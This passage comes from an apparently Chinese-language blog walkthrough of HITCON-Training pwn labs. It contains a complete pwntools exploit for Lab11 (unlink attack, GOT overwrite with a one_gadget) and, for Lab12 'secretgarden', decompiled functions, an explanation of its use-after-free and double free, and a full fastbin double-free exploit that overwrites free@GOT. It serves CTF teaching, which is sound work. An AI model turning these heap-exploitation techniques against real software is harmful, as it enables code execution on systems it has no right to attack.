class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">edit</span><span class=\"params\">(index, size, name)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice:\"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">'3'</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"item:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"name:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"item:\"</span>)</span><br><span class=\"line\">\tp.send(name)</span><br><span class=\"line\">itemlist = <span class=\"number\">0x6020c0</span></span><br><span class=\"line\">one_gadget = <span class=\"number\">0xf02a4</span></span><br><span class=\"line\"></span><br><span class=\"line\">ptr = itemlist + <span class=\"number\">0x8</span></span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"a\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x10</span>, <span class=\"string\">\"b\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x80</span>, <span class=\"string\">\"c\"</span> * <span class=\"number\">0x10</span>)</span><br><span class=\"line\">payload = p64(<span class=\"number\">0</span>) + p64(<span class=\"number\">0x61</span>) + p64(ptr - <span class=\"number\">0x18</span>) + p64(ptr - <span class=\"number\">0x10</span>)</span><br><span class=\"line\">payload += (<span class=\"number\">0x60</span> - <span class=\"number\">0x20</span>) * <span class=\"string\">\"a\"</span> + p64(<span class=\"number\">0x60</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, len(payload), payload)</span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">\"b\"</span> * <span class=\"number\">0x10</span> + p64(<span class=\"number\">0xa0</span>) + p64(<span class=\"number\">0x90</span>)</span><br><span class=\"line\">edit(<span class=\"number\">1</span>, len(payload), payload)</span><br><span class=\"line\"></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">atoi_got = elf.got[<span class=\"string\">'atoi'</span>]</span><br><span class=\"line\"><span class=\"comment\"># now ptr = 0x6020b0</span></span><br><span class=\"line\">payload = p64(<span class=\"number\">0</span>) * <span class=\"number\">2</span></span><br><span class=\"line\">payload += p64(<span class=\"number\">0</span>) + p64(atoi_got)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, len(payload), payload)</span><br><span class=\"line\"></span><br><span class=\"line\">show(<span class=\"number\">0</span>)</span><br><span class=\"line\">addr = u64(p.recvuntil(<span class=\"string\">\"\\x7f\"</span>)[<span class=\"number\">-6</span>:].ljust(<span class=\"number\">8</span>,<span class=\"string\">\"\\x00\"</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">libc.address = addr - libc.symbols[<span class=\"string\">'atoi'</span>]</span><br><span class=\"line\">system = libc.symbols[<span class=\"string\">'system'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">payload = p64(one_gadget + libc.address)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>, len(payload), payload)</span><br><span class=\"line\"></span><br><span class=\"line\">p.recvuntil(<span class=\"string\">\":\"</span>)</span><br><span class=\"line\">p.sendline(<span class=\"string\">\"any\"</span>)</span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h2 id=\"Lab12——secretgarden\"><a href=\"#Lab12——secretgarden\" class=\"headerlink\" title=\"Lab12——secretgarden\"></a>Lab12——secretgarden</h2><h3 id=\"防护-2\"><a href=\"#防护-2\" class=\"headerlink\" title=\"防护\"></a>防护</h3><p>和Lab11类似，也没有开启pie。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">liwc@ubuntu:~/pwn/HITCON-Training/LAB/lab12$ checksec secretgarden</span><br><span class=\"line\">[*] &apos;/home/liwc/pwn/HITCON-Training/LAB/lab12/secretgarden&apos;</span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Partial RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>\n<h3 id=\"分析-2\"><a href=\"#分析-2\" class=\"headerlink\" title=\"分析\"></a>分析</h3><p>主要功能有add, visit, del和clean。</p>\n<h4 id=\"add\"><a href=\"#add\" class=\"headerlink\" title=\"add\"></a>add</h4><p>这里我们通过逆向得到flower结构体的结构为：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">struct flower&#123;</span><br><span class=\"line\">\t+0x0 DWORD inuse; // 初始化之后会置为1</span><br><span class=\"line\">  +0x8 char* name;</span><br><span class=\"line\">  +0x10 char[24] color; // 通过scanf（&quot;%23s&quot;）输入，说明至少为23位</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>add函数中，首先判断flowercount是否大于0x63，是则直接退出。然后malloc一个0x28的chunk，并均初始化为0。然后用scanf读入name的长度，这里检查长度size不为-1，防止整数溢出。然后malloc(size)的chunk，再读入name和color。最后会存储在flowerlist上，并将flowercount自增1</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">add</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">void</span> *v0; <span class=\"comment\">// rsi</span></span><br><span class=\"line\">  <span class=\"keyword\">size_t</span> size; <span class=\"comment\">// [rsp+0h] [rbp-20h]</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *s; <span class=\"comment\">// [rsp+8h] [rbp-18h]</span></span><br><span class=\"line\">  <span class=\"keyword\">void</span> *buf; <span class=\"comment\">// [rsp+10h] [rbp-10h]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v5; <span class=\"comment\">// [rsp+18h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v5 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  s = <span class=\"number\">0L</span>L;</span><br><span class=\"line\">  buf = <span class=\"number\">0L</span>L;</span><br><span class=\"line\">  LODWORD(size) = <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)flowercount &gt; <span class=\"number\">0x63</span> )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"The garden is overflow\"</span>);</span><br><span class=\"line\">  s = <span class=\"built_in\">malloc</span>(<span class=\"number\">0x28</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">memset</span>(s, <span class=\"number\">0</span>, <span class=\"number\">0x28</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Length of the name :\"</span>, <span class=\"number\">0L</span>L, size);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)__isoc99_scanf(<span class=\"string\">\"%u\"</span>, &amp;size) == <span class=\"number\">-1</span> )</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">  buf = <span class=\"built_in\">malloc</span>((<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)size);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !buf )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Alloca error !!\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">exit</span>(<span class=\"number\">-1</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"The name of flower :\"</span>, size);</span><br><span class=\"line\">  v0 = buf;</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, (<span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span>)size);</span><br><span class=\"line\">  *((_QWORD *)s + <span class=\"number\">1</span>) = buf;</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"The color of the flower :\"</span>, v0, size);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">\"%23s\"</span>, (<span class=\"keyword\">char</span> *)s + <span class=\"number\">16</span>);</span><br><span class=\"line\">  *(_DWORD *)s = <span class=\"number\">1</span>;</span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( HIDWORD(size) = <span class=\"number\">0</span>; HIDWORD(size) &lt;= <span class=\"number\">0x63</span>; ++HIDWORD(size) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( !*(&amp;flowerlist + HIDWORD(size)) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      *(&amp;flowerlist + HIDWORD(size)) = s;</span><br><span class=\"line\">      <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  ++flowercount;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"Successful !\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"del\"><a href=\"#del\" class=\"headerlink\" title=\"del\"></a>del</h4><p>会根据输入的index，将对应flowerlist中的flower结构体的inuse置为0，然后free掉name的chunk，注意这里存在uaf漏洞，而且没有free flower结构体堆块</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">del</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">int</span> result; <span class=\"comment\">// eax</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> v1; <span class=\"comment\">// [rsp+4h] [rbp-Ch]</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> __int64 v2; <span class=\"comment\">// [rsp+8h] [rbp-8h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  v2 = __readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( !flowercount )</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"No flower in the garden\"</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">\"Which flower do you want to remove from the garden:\"</span>);</span><br><span class=\"line\">  __isoc99_scanf(<span class=\"string\">\"%d\"</span>, &amp;v1);</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( v1 &lt;= <span class=\"number\">0x63</span> &amp;&amp; *(&amp;flowerlist + v1) )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    *(_DWORD *)*(&amp;flowerlist + v1) = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(*((<span class=\"keyword\">void</span> **)*(&amp;flowerlist + v1) + <span class=\"number\">1</span>));</span><br><span class=\"line\">    result = <span class=\"built_in\">puts</span>(<span class=\"string\">\"Successful\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">\"Invalid choice\"</span>);</span><br><span class=\"line\">    result = <span class=\"number\">0</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> result;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"clean\"><a href=\"#clean\" class=\"headerlink\" title=\"clean\"></a>clean</h4><p>判断对应flower的chunk不为null且inuse标记为0，就free掉flower结构体，然后将flowercount自减1。也就是说，这个函数没有free flower的name的堆块。理论上应该先调用del，再调用clean。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">clean</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> i; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">0x63</span>; ++i )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ( *(&amp;flowerlist + i) &amp;&amp; !*(_DWORD *)*(&amp;flowerlist + i) )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">free</span>(*(&amp;flowerlist + i));</span><br><span class=\"line\">      *(&amp;flowerlist + i) = <span class=\"number\">0L</span>L;</span><br><span class=\"line\">      --flowercount;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"built_in\">puts</span>(<span class=\"string\">\"Done!\"</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h4 id=\"visit\"><a href=\"#visit\" class=\"headerlink\" title=\"visit\"></a>visit</h4><p>根据对应flowerlist上对应chunk的inuse位，若inuse位不为0，则输出name和color。</p>\n<figure class=\"highlight c++\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">visit</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  __int64 v0; <span class=\"comment\">// rax</span></span><br><span class=\"line\">  <span class=\"keyword\">unsigned</span> <span class=\"keyword\">int</span> i; <span class=\"comment\">// [rsp+Ch] [rbp-4h]</span></span><br><span class=\"line\"></span><br><span class=\"line\">  LODWORD(v0) = flowercount;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> ( flowercount )</span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> ( i = <span class=\"number\">0</span>; i &lt;= <span class=\"number\">0x63</span>; ++i )</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      v0 = (__int64)*(&amp;flowerlist + i);</span><br><span class=\"line\">      <span class=\"keyword\">if</span> ( v0 )</span><br><span class=\"line\">      &#123;</span><br><span class=\"line\">        LODWORD(v0) = *(_DWORD *)*(&amp;flowerlist + i);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ( (_DWORD)v0 )</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          <span class=\"built_in\">printf</span>(<span class=\"string\">\"Name of the flower[%u] :%s\\n\"</span>, i, *((_QWORD *)*(&amp;flowerlist + i) + <span class=\"number\">1</span>));</span><br><span class=\"line\">          LODWORD(v0) = <span class=\"built_in\">printf</span>(<span class=\"string\">\"Color of the flower[%u] :%s\\n\"</span>, i, (<span class=\"keyword\">char</span> *)*(&amp;flowerlist + i) + <span class=\"number\">16</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">else</span></span><br><span class=\"line\">  &#123;</span><br><span class=\"line\">    LODWORD(v0) = <span class=\"built_in\">puts</span>(<span class=\"string\">\"No flower in the garden !\"</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> v0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"利用-2\"><a href=\"#利用-2\" class=\"headerlink\" title=\"利用\"></a>利用</h3><p>该题目程序功能比较复杂，但是主要漏洞在于对堆块是否被释放的管理逻辑有误。del函数会将指定index的chunk的<em>inuse置0</em>，并且将对应的name chunk free掉，但是没有free 指定index的chunk本身。clean函数会将所有inuse位不为0且不为null的chunk free掉。而visit函数会根据inuse位是否为1来决定是否输出对应信息。</p>\n<p>注意，该题由于没有setvbuf，所以需要先调用一次add函数将缓冲区申请出来。</p>\n<p>注意到，该题在调用del之后，如果不调用clean，将不会从全局数组上删除对应chunk指针，所以存在潜在的double free漏洞。在此构造一个fastbin 2free，实现任意地址分配。</p>\n<p>一般来说，通过inuse这种方式判断是否可以free是不安全的，一般都可能存在2free漏洞。</p>\n<p>这里要实现任意地址分配，需要控制size。我们需要在想改的got表覆盖找一个地址，size在fastbin范围内，在got表前面一个byte一个byte的查看字节偏移，找到0x601fffa为合适的地址</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">gef➤  x/32gx 0x601ffa</span><br><span class=\"line\">0x601ffa:\t0x1e28000000000000\t0x0168000000000060</span><br><span class=\"line\">0x60200a:\t0x0ee000007fd5662b\t0x34f000007fd5660a</span><br><span class=\"line\">0x60201a &lt;free@got.plt+2&gt;:\t0xe69000007fd565d4\t0x07b600007fd565d2</span><br><span class=\"line\">0x60202a &lt;__stack_chk_fail@got.plt+2&gt;:\t0x4800000000000040\t0x197000007fd565d1</span><br><span class=\"line\">0x60203a &lt;memset@got.plt+2&gt;:\t0xb20000007fd565e3\t0x68e000007fd565d8</span><br><span class=\"line\">0x60204a &lt;close@got.plt+2&gt;:\t0x625000007fd565db\t0xf74000007fd565db</span><br><span class=\"line\">0x60205a &lt;__libc_start_main@got.plt+2&gt;:\t0x43c000007fd565cd\t0x313000007fd565cf</span><br><span class=\"line\">0x60206a &lt;malloc@got.plt+2&gt;:\t0xee7000007fd565d4\t0x603000007fd565d2</span><br><span class=\"line\">0x60207a &lt;open@got.plt+2&gt;:\t0x5e8000007fd565db\t0xa4d000007fd565cf</span><br><span class=\"line\">0x60208a &lt;__isoc99_scanf@got.plt+2&gt;:\t0x088600007fd565d2\t0x0000000000000040</span><br><span class=\"line\">0x60209a:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x6020aa:\t0x0000000000000000\t0x0000000000000000</span><br><span class=\"line\">0x6020ba:\t0x4620000000000000\t0x000000007fd56608</span><br><span class=\"line\">0x6020ca:\t0x0000000000030000\t0x0000000000000000</span><br><span class=\"line\">0x6020da:\t0x4010000000000000\t0x507000000000017f</span><br><span class=\"line\">0x6020ea &lt;flowerlist+10&gt;:\t0x50c000000000017f\t0x000000000000017f</span><br></pre></td></tr></table></figure>\n<p>由fastbin数组索引计算的宏定义可知，高四位不影响size的大小。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#define fastbin_index(sz) \\</span><br><span class=\"line\">\t((((unsigned int) (sz)) &gt;&gt; (SIZE_SZ == 8 ? 4 : 3)) - 2)</span><br></pre></td></tr></table></figure>\n<p>在分配到该位置后，复写got表即可实现利用，exp如下：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\"><span class=\"comment\"># from LibcSearcher import *</span></span><br><span class=\"line\"></span><br><span class=\"line\">libc = ELF(<span class=\"string\">\"/lib/x86_64-linux-gnu/libc.so.6\"</span>)</span><br><span class=\"line\">context.log_level = <span class=\"string\">\"debug\"</span></span><br><span class=\"line\">elf = ELF(<span class=\"string\">\"./secretgarden\"</span>)</span><br><span class=\"line\">p = process(<span class=\"string\">\"./secretgarden\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">add</span><span class=\"params\">(size, name, color)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"1\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"name :\"</span>)</span><br><span class=\"line\">\tp.sendline(str(size))</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"flower :\"</span>)</span><br><span class=\"line\">\tp.send(name)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"flower :\"</span>)</span><br><span class=\"line\">\tp.sendline(color)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">visit</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"2\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">del_</span><span class=\"params\">(index)</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"3\"</span>)</span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"garden:\"</span>)</span><br><span class=\"line\">\tp.sendline(str(index))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">clean</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">\tp.recvuntil(<span class=\"string\">\"choice : \"</span>)</span><br><span class=\"line\">\tp.sendline(<span class=\"string\">\"4\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">magic = <span class=\"number\">0x400c7b</span></span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span class=\"string\">\"a\"</span>, <span class=\"string\">\"aaaa\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span class=\"string\">\"b\"</span>, <span class=\"string\">\"bbbb\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span class=\"string\">\"c\"</span>, <span class=\"string\">\"cccc\"</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 1-&gt;2-&gt;1</span></span><br><span class=\"line\">del_(<span class=\"number\">1</span>)</span><br><span class=\"line\">del_(<span class=\"number\">2</span>)</span><br><span class=\"line\">del_(<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">addr = <span class=\"number\">0x601ffa</span></span><br><span class=\"line\">freegot = elf.got[<span class=\"string\">'free'</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, p64(addr), <span class=\"string\">\"fake\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span class=\"string\">\"d\"</span>, <span class=\"string\">\"dddd\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>, <span class=\"string\">\"e\"</span>, <span class=\"string\">\"eeee\"</span>)</span><br><span class=\"line\">add(<span class=\"number\">0x50</span>,<span class=\"string\">\"a\"</span>*<span class=\"number\">6</span> + p64(<span class=\"number\">0</span>) + p64(magic) * <span class=\"number\">2</span> ,<span class=\"string\">\"red\"</span>) <span class=\"comment\">#malloc in fake_chunk</span></span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br></pre></td></tr></table></figure>\n<h3 id=\"提高-1\"><a href=\"#提高-1\" class=\"headerlink\" title=\"提高\"></a>提高</h3><h4 id=\"leak-libc\"><a href=\"#leak-libc\" class=\"headerlink\" title=\"leak libc\"></a>leak libc</h4><p>leak libc最简单的方法之一，就是使用unsorted bin攻击，将free后的unsorted bin，直接malloc，这不会改变其中泄漏出的libc地址。通过overlapping，或者修改inuse等辅助变量，也都可能实现leak libc。这里我们使用unsorted bin攻击直接leak libc。</p>\n<h4 id=\"劫持控制流\"><a href=\"#劫持控制流\" class=\"headerlink\" 